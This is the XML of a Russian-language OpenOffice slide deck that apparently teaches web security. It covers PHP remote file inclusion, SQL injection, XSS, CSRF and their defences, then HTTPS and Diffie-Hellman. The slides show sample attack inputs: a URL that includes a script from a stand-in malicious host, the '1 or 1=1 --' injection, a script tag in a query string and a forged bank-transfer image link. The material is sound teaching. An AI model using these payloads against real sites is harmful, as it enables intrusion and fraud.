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7.273cm"/>
    </style:style>
    <style:style style:name="pr5" style:family="presentation" style:parent-style-name="Default-outline1">
      <style:graphic-properties fo:min-height="16.773cm"/>
    </style:style>
    <style:style style:name="pr6" style:family="presentation" style:parent-style-name="Default-outline1">
      <style:graphic-properties fo:min-height="18cm"/>
    </style:style>
    <style:style style:name="pr7" style:family="presentation" style:parent-style-name="Default-outline1">
      <style:graphic-properties fo:min-height="17.773cm"/>
    </style:style>
    <style:style style:name="pr8" style:family="presentation" style:parent-style-name="Default-title">
      <style:graphic-properties fo:min-height="2.163cm"/>
    </style:style>
    <style:style style:name="pr9" style:family="presentation" style:parent-style-name="Default-outline1">
      <style:graphic-properties fo:min-height="15.273cm"/>
    </style:style>
    <style:style style:name="pr10" style:family="presentation" style:parent-style-name="Default-outline1">
      <style:graphic-properties fo:min-height="16.273cm"/>
    </style:style>
    <style:style style:name="pr11" style:family="presentation" style:parent-style-name="Default-outline1">
      <style:graphic-properties fo:min-height="18.273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style:text-position="super 70%"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties style:text-position="super 75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Некоторые методы взлома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>PHP-инъекция</text:p>
                <text:p text:style-name="P1">SQL-инъекция</text:p>
                <text:p text:style-name="P1">XSS межсайтовый скриптинг </text:p>
                <text:p text:style-name="P1">CSRF межсайтовая подделка запроса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HP-инъекция</text:p>
              </text:list-header>
            </text:list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Выполнение постороннего кода на стороне сервера</text:p>
                <text:p>Возможна, если входные параметры принимаются без проверки</text:p>
                <text:p>Если в качестве параметра передан посторонний скрипт, он может быть исполнен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$script = $_GET['script'];</text:p>
                <text:p>include ($script.'.php');</text:p>
                <text:p>Если в запросе будет передано значение http://vredsite.com/vred, например:</text:p>
                <text:p>http://site.ru?script=http://vredsite.com/vred</text:p>
                <text:p>то include включит во время выполнения постороний скрипт http://vredsite.com/vred.ph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16.773cm" svg:x="1.4cm" svg:y="2cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>Для предотвращения следует применять проверку параметров и разрешать выполнение только при предопределённых значениях:</text:p>
                <text:p>if ($script == 'main') include 'main.php'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QL-инъекция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Самая распространённая разновидность <text:s/>— передача скрипту, работающему с базой данных, некорректных данных, которые скрипт использует при построении команды SQL посредством объединения строк</text:p>
                <text:p>Это позволяет изменить запрос SQL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5.199cm" svg:height="18cm" svg:x="1.4cm" svg:y="1.5cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>$query = "SELECT * FROM table WHERE id =".$id;</text:p>
                <text:p>$res = mysqli_query($db, $query);</text:p>
                <text:p>Если в переменную $id передать значение </text:p>
                <text:p>1 or 1=1 --</text:p>
                <text:p>(index.php?id=1 or 1=1 --)</text:p>
                <text:p>то выполнится следующий запрос:</text:p>
                <text:p>SELECT * FROM table WHERE id =1 or 1=1 --</text:p>
                <text:p>Поскольку выражение 1=1 всегда истинно, из <text:s/>таблицы будут выбраны все записи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Основные меры защиты сводятся к использованию специально обработанных или параметризованных команд SQL, также называемых подготовленными командами (prepared statements).</text:p>
                <text:p>Современные CMS и фреймворки постороены таким образом, чтобы разработчику не требовалось использовать прямые запросы к базе данных, для этого существует специальные AP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XS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XSS (Cross-Site Scripting) — межсайтовый скриптинг </text:p>
                <text:p>X в аббревиатуре выбрана, чтобы не путать с CSS</text:p>
                <text:p>Внедрение на страницу "надёжного" сайта вредоносного код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В результате внедрения пользоваетль получает в браузере объединённый контент: код страницы "надёжного" сайта и внедрённый JavaScript-код (чаще всего)</text:p>
                <text:p>Внедрённый код получает доступ к cookies и другой информации, хранимой браузером</text:p>
                <text:p/>
                <text:p>http://site.com/search.php?q=&lt;script&gt;vredFunction();&lt;/script&gt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layer="layout" svg:width="25.199cm" svg:height="2.163cm" svg:x="1.4cm" svg:y="0.737cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>CSRF</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr2" draw:layer="layout" svg:width="25.199cm" svg:height="13.859cm" svg:x="1.4cm" svg:y="3.714cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>CSRF (Сross Site Request Forgery) — межсайтовая подделка запроса</text:p>
                <text:p>Если посетитель заходит на вредоносный сайт, от его лица тайно отправляется запрос на другой сервер (например, на сервер платёжной системы для перевода денег)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9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Для осуществления данной атаки посетитель должен быть аутентифицирован на том сервере, куда отправляется запрос, и этот запрос не должен требовать какого-либо подтверждения, которое не может быть проигнорировано или подделано атакующим скриптом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layer="layout" svg:width="25.199cm" svg:height="17.959cm" svg:x="1.4cm" svg:y="1cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>Простейший пример: размещение картинки (с целью спровоцировать её загрузку), где в качестве адреса изображения передаётся url c параметрами вредоносной опреации</text:p>
                <text:p>&lt;img src="http://bank.com/perevod?account=user1&amp;amount=1000000&amp;for=user2"&gt;</text:p>
                <text:p>Если bank.com хранит аутентификацию user1, то при попытке загрузить картинку браузер отправит запрос на перевод денег от user1 к user2</text:p>
                <text:p>Если дополнительных проверок и подтверждений непредусмотрено, перевод состоитс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В качестве защиты применяется механизм, когда с каждым запросом пользователя передаётся секретный ключ, который должен быть в теле запроса, а не в адресе страницы</text:p>
                <text:p>Сервер перед выполнением каких-либо действий проверяет наличие и правильность переданного ключ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0" draw:layer="layout" svg:width="25.199cm" svg:height="16.273cm" svg:x="1.4cm" svg:y="2.5cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>В любом случае все принимаемые параметры должны проходить проверку и очищаться от возможных вредоносных данных</text:p>
                <text:p/>
                <text:p>Для этого в PHP существует ряд функций, которые делают входные данные безопасными для некоторых атак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strip_tags () - удаляет все html- и php-теги</text:p>
                <text:p>htmlspecialchars () - преобразует специальные символы (которые могут иметь значение ) в html-сущности</text:p>
                <text:p>Например, &amp; преобразуется в &amp;amp;</text:p>
                <text:p>Кавычки " в &amp;quot;</text:p>
                <text:p>Знаки &lt; и &gt; в &amp;lt; и &amp;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TTP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HyperText Transfer Protocol Secure - расширение протокола HTTP для поддержки шифрования в целях повышения безопасности.</text:p>
                <text:p>HTTPS не является отдельным протоколом. Это обычный HTTP, использующий шифрование. Он обеспечивает защиту от атак, основанных на прослушивании сетевого соединения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5.199cm" svg:height="16.773cm" svg:x="1.4cm" svg:y="2cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>Для работы по протоколу HTTPS на сервере должен быть установлен цифровой сертификат с открытым и закрытым ключом для шифрования данных</text:p>
                <text:p>Эти сертификаты вылаются специальными удостоверяющими центрами, но могут быть выпущены самостоятельно (так называемые самоподписанные сертификаты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9cm" svg:height="16.773cm" svg:x="1.4cm" svg:y="2cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>Если сервер работает по протоколу HTTPS, то все запросы, отправляемые со стороны пользователя шифруются и не передаются в открытом виде</text:p>
                <text:p>Таким образом осуществляется защита передаваемых данных (логина, пароля, номера банковского счёта и пр.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Идея шифрования основана на том, что две стороны могут обменяться некоторыми открытыми данными, которые позволят одной стороне зашифровать передаваемые данные, а второй расшифровать их.</text:p>
                <text:p>При этом треться сторона, ктороая имеет возможность перехватить открытые данные, не имеет возможности за разумный период времени расшифровать их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1" draw:layer="layout" svg:width="25.199cm" svg:height="18.273cm" svg:x="1.4cm" svg:y="0.5cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>Пример такого шифрования – протокол Диффи-Хеллмана</text:p>
                <text:p>Два абонента А и В обмениваются двумя произвольными числами p и g</text:p>
                <text:p>Затем оба генерируют большие случайные числа a и b и вычисляют следующие остатки от деления:</text:p>
                <text:p>A=g<text:span text:style-name="T1">a</text:span> mod p</text:p>
                <text:p>B=g<text:span text:style-name="T2">b</text:span> mod p</text:p>
                <text:p>и пересылают друг другу эти значения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После этого абонент A вычисляет из полученного значения:</text:p>
                <text:p>B<text:span text:style-name="T1">a </text:span>mod p = g<text:span text:style-name="T2">ba</text:span> mod p <text:tab/></text:p>
                <text:p>а абонент B вычисляет</text:p>
                <text:p>A<text:span text:style-name="T1">b</text:span> mod p = g<text:span text:style-name="T2">ab</text:span> mod p</text:p>
                <text:p>Оба абонента в результате вычислений получили одно и то же число </text:p>
                <text:p>K=g<text:span text:style-name="T2">ab</text:span> mod p</text:p>
                <text:p>которое они и могут использовать в качестве секретного ключа для шифрования и дешифрования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5.199cm" svg:height="16.773cm" svg:x="1.4cm" svg:y="2cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>Если числа a и b выбраны достаточно большими, то перехват третьим лицом открытых данных не позволит за разумное время провести подбор секретного ключ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33M41S</meta:editing-duration>
    <meta:editing-cycles>36</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.7$Win32 OpenOffice.org_project/417m1$Build-9800</meta:generator>
    <dc:date>2020-04-12T20:33:59.53</dc:date>
    <dc:creator>Pooh VVS</dc:creator>
    <meta:document-statistic meta:object-count="93"/>
  </office:meta>
</office:document-meta>
</file>